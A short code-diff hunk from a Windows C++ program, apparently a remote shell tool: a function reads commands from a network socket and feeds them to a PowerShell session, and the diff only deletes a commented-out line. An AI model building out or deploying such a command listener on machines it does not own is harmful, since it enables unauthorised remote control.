@@ -11,7 +11,6 @@ VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
     INT iBytesReceived;
     CHAR carrRecvbuf[4096];
     std::string szCommandOutput;
-    //PowerShellSession psSession;
 
     while ((iBytesReceived = recv(socket, carrRecvbuf, sizeof(carrRecvbuf) - 1, 0)) > 0) {
         carrRecvbuf[iBytesReceived] = '\0';
